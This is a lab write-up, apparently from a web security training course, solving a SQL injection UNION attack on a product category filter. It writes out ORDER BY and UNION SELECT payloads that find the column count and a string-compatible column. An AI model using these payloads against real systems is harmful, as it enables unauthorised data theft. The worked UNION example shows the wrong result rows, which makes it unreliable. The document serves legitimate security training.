# Description:
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 


# Analysis:
SQLi - Product category filter

End Goal: Determine the number of columns retuerned by the query.

Background (unions):

Table 1       
| a | b |     
| - | - |     
| 1 | 2 |     
| 3 | 4 |     

Table 2
| c | d |
| - | - |
| 5 | 6 | 
| 7 | 8 |


Query #1: select a, b from table1
Result:
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
Result:
1,2
3,4
2,3
4,5

Rule: 
 - The number and the order of the columns must be the same in all queries.
 - The data types must be compatible.

    ## In a Union based SQLi attack we have a couple of steps lets enumerate the first two:
        -  Step #1: Determine the number of columns. (ref-lab-03)
        -  Step #2: Determine the data type of the columns. (ref-lab-04[this])

    ## Determine the data type of the columns once you have the number of columns:
        - We know from lab-03 that we have 3 columns in our query
        - So we are going to iterativaly put a data type in our query: 
        
            For column 1: select a, b, c from table1 UNION select 'a', NULL, NULL 
            -> error -> the first column is not a string value 
            -> success -> the first column is a string value
        
            For column 2: select a, b, c from table1 UNION select  NULL, 'a', NULL 
            -> error -> the second column is not a string value 
            -> success -> the second column is a string value 
        
            For column 3: select a, b, c from table1 UNION select  NULL, NULL, 'a' 
            -> error -> the third column is not a string value 
            -> success -> the third column is a string value 

# Execution

Step #1 Determining the number of columns, the query will be placed like this example: /filter?category=Gifts' order by 4-- :
    
    query1: ' order by 1-- (If this query give us an error there is only 0 columns)
    
    query2: ' order by 2-- (If this query give us an error there is only 1 columns)
    
    query3: ' order by 3-- (If this query give us an error there is only 2 columns)
    
    query4: ' order by 4-- (If this query give us an error there is only 3 columns) -> err -> There are only three columns

Step #2 Determine the data type of the columns, the query will be placed like this example: /filter?category=Gifts' UNION select 'a', NULL, NULL :

    query1: ' UNION select 'a', NULL, NULL-- (If this query doesn't give us an error the first column is a string) -> err ->likely because it's and id field 
    query2: ' UNION select NULL, 'a', NULL-- (If this query doesn't give us an error the second column is a string) -> success -> string type
    query2: ' UNION select NULL, NULL, 'a'-- (If this query doesn't give us an error the third column is a string) -> err -> not a string type

To complete the excercise we need to retrieve 'lP6xtu':
    query: ' UNION select NULL, 'lP6xtu', NULL-- // Exercise solved!!